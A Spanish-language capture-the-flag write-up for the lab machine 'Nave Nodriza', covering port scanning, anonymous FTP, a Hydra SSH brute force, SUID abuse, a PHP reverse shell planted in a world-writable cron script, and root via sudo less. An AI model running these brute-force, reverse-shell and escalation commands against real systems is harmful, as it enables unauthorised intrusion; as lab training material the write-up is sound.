
# 🚀 Resolución del CTF: Nave Nodriza

> *"En el vasto universo de los sistemas, cada vulnerabilidad es una puerta hacia el conocimiento"* 🌌

---

## 📋 Tabla de Contenidos
1. [Enumeración](#-enumeración)
2. [Descubrimiento de Puertos](#-descubrimiento-de-puertos)
3. [Puerto 21 (FTP)](#-puerto-21-ftp)
4. [Explotación](#-explotación)
5. [Acceso SSH](#-acceso-ssh)
6. [Escalada de Privilegios](#-escalada-de-privilegios)
   - [Usuario Analista](#usuario-analista)
   - [Usuario Investigador](#usuario-investigador)
   - [Root](#root)
7. [Conclusión](#-conclusión)

---

## 🔍 Enumeración

- **Máquina Objetivo:** `10.0.2.33`
- **Máquina Atacante:** `10.0.2.3`

---

## 🛠️ Descubrimiento de Puertos

Se realiza un escaneo inicial con `nmap` para identificar servicios activos y versiones:

```bash
nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn 10.0.2.33
```

**Resultados del escaneo:**

| Puerto | Estado | Servicio       | Versión                     |
|--------|--------|----------------|-----------------------------|
| 21/tcp | Abierto | FTP            | `vsftpd 3.0.3`              |
| 22/tcp | Abierto | SSH            | `OpenSSH 9.2p1 Debian`      |
| 80/tcp | Abierto | HTTP           | `Apache httpd 2.4.65`      |

---

## 📂 Puerto 21 (FTP)

Se detecta que el servicio FTP permite **login anónimo**:

```bash
ftp -a 10.0.2.33
```

**Estructura del directorio `/archivos_publicos`:**

```
drwxr-xr-x 2 65534 65534 4096 Dec 09 02:32 archivos_publicos
```

**Contenido del archivo `manifiesto_clase_alpha.txt`:**

```text
[NAVE NODRIZA - BITÁCORA DE COMUNICACIÓN]

Mensaje para el Capitán Jano:

"Capitán, confirmo el descenso de emergencia en Titán. La tripulación fue reubicada en grupos de trabajo basados en su rango. Lamentablemente, el protocolo de seguridad falló en las bajas jerarquías. La contraseña de mi terminal de acceso (SSH) fue comprometida; es un término de uso muy común aquí, lo encontré en un listado de seguridad de la vieja Tierra. Debe ser reemplazada inmediatamente. Necesito que el equipo de Analistas me abra un canal de escalada urgente para recuperar el control de mi sesión."

Atentamente,
excluido
```

🔍 **Pistas clave:**
- Usuario potencial: `excluido`
- Contraseña relacionada con una **wordlist** (ej. `rockyou.txt`)

---

## 💻 Explotación

### 🔑 Ataque de Fuerza Bruta con Hydra

```bash
hydra -l excluido -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.33
```

**Credenciales obtenidas:**
```text
[22][ssh] host: 10.0.2.33   login: excluido   password: password
```

---

## 🔓 Acceso SSH

Con las credenciales, se establece conexión SSH:

```bash
ssh excluido@10.0.2.33
```

**Mensaje de advertencia al iniciar sesión:**
```
***************************************************
* ADVERTENCIA: CONEXIÓN A NAVE-NODRIZA ACTIVA   *
* PROTOCOLO ALPHA. ACCESO RESTRINGIDO.          *
***************************************************
```

**Archivos en el directorio personal de `excluido`:**
- `user.txt` (🏆 **Flag de usuario**)
- `Pista_CAPITULO_2.txt` (📜 **Pista para escalada de privilegios**)

**Contenido de `Pista_CAPITULO_2.txt`:**
```text
[CAPÍTULO 2: ESCALADA DE RANGO]
-----------------------------
Un comando de uso frecuente en el sistema fue modificado por el equipo de Analistas de Datos para ejecutar tareas con su identidad.
Necesito encontrar el archivo y, debo usarlo para entrar a sus sistemas.
```

---

## 🔐 Escalada de Privilegios

### 👨‍💼 Usuario Analista

Se buscan archivos con permisos **SUID**:

```bash
find / -perm -4000 2>/dev/null
```

**Resultado:**
```text
/opt/nave_nodriza_herramientas/ejecutor_shell
```

Al ejecutar el binario, se obtiene una shell como `analista`:

```bash
/opt/nave_nodriza_herramientas/ejecutor_shell
```

---

### 🔍 Usuario Investigador

En el directorio de `analista`, se encuentra `/log_temporal_sistema/procesar_datos.sh` con permisos **777** (🚨 **¡Editable por todos!**).

Se monitorea la ejecución del script con `pspy64`:

```bash
/tmp/pspy64
```

**Observación:**
```text
2026/05/09 10:00:00 CMD: UID=1003  PID=1018   | /bin/sh -c /home/analista/log_temporal_sistema/procesar_datos.sh
```

🔹 **UID 1003** corresponde al usuario `investigador`.

**Explotación:**
1. Se reemplaza `procesar_datos.sh` con una **reverse shell en PHP**:
   ```bash
   php -r '$sock=fsockopen("10.0.2.3",443);exec("sh <&3 >&3 2>&3");'
   ```
2. Se inicia un listener en la máquina atacante:
   ```bash
   nc -nlvp 443
   ```
3. Tras la ejecución del script, se obtiene una shell como `investigador`.

---

### 👑 Root

Se revisan los permisos `sudo` del usuario `investigador`:

```bash
sudo -l
```

**Resultado:**
```text
User investigador may run the following commands on TheHackersLabs-NaveNodriza:
    (root) NOPASSWD: /usr/bin/less
```

**Explotación:**
1. Se ejecuta `less` como `root`:
   ```bash
   sudo /usr/bin/less /etc/hosts
   ```
2. Dentro de `less`, se ejecuta un shell como `root`:
   ```bash
   !/bin/bash
   ```

**🏆 Flag Final:**
```text
cat /root/flag.txt
```

---

## ✅ Conclusión

| Nivel       | Usuario       | Método                          | Flag Obtenida       |
|-------------|---------------|---------------------------------|---------------------|
| **Usuario** | `excluido`    | Fuerza bruta con Hydra (SSH)    | `user.txt`          |
| **Analista**| `analista`    | Binario SUID (`ejecutor_shell`) | -                   |
| **Investigador**| `investigador` | Reverse shell via `procesar_datos.sh` | -           |
| **Root**    | `root`        | Abuso de `sudo` con `less`      | `flag.txt`          |

🎯 **Lecciones aprendidas:**
- La enumeración exhaustiva es clave.
- Los permisos 777 pueden ser una puerta trasera.
- Herramientas como `pspy64` revelan cron jobs ocultos.
- `less` puede ser un vector de escalada inesperado.

---
> *"La seguridad no es un destino, sino un viaje de descubrimiento constante"* 🌠

**¡Gracias por leer!** 🚀
```
